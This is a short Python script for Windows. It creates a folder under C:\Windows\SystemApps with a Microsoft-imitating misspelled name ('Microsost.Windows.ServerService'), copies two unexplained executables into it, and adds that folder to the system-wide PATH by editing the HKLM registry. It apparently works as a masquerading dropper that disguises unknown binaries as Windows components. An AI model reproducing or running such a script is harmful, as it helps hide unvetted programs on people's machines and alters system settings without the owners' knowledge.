import winreg
from subprocess import call

call("mkdir C:\Windows\SystemApps\Microsost.Windows.ServerService", shell=True)
call("xcopy chc.exe C:\Windows\SystemApps\Microsost.Windows.ServerService /Y /i", shell=True)
call("xcopy chs.exe C:\Windows\SystemApps\Microsost.Windows.ServerService /Y /i", shell=True)

with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment") as key:
    env = winreg.QueryValueEx(key, "Path")[0]
    env += ";C:\\Windows\\SystemApps\\Microsost.Windows.ServerService\\"
    winreg.SetValueEx(key, "Path", 0, winreg.REG_EXPAND_SZ, env)
        